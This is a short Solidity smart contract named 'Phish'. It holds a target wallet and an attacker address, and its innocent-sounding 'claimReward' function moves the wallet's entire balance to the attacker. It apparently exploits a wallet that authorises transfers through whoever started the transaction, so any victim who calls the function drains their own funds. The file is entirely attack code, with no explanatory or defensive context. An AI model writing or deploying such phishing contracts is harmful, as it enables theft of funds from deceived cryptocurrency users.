// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IWallet {
    function deposit() external payable;
    function transfer(address payable to, uint256 amount) external;
}

contract Phish {
    IWallet public immutable wallet;
    address payable public immutable attacker;

    constructor(address _wallet, address payable _attacker) {
        wallet = IWallet(_wallet);
        attacker = _attacker;
    }

    function claimReward() external {
        wallet.transfer(attacker, address(wallet).balance);
    }
}
